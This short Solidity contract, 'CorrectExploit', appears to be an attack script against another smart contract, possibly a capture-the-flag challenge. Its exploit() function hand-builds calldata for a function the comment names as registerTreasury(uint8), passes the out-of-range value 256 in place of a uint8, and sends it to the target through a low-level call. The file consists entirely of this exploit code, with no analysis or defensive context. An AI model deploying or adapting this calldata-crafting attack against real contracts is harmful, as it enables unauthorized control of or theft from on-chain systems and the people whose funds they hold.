pragma solidity ^0.6.12;

contract CorrectExploit {
    address public immutable target;

    constructor(address _target) public {
        target = _target;
    }

    function exploit() external {
        // CORRECT selector for registerTreasury(uint8) is 0x3c6d22c9
        bytes memory payload = abi.encodePacked(
            bytes4(0x3c6d22c9),
            hex"0000000000000000000000000000000000000000000000000000000000000100"
        );
        (bool success, ) = target.call{gas: 100000}(payload);
        require(success, "Exploit failed");
    }
}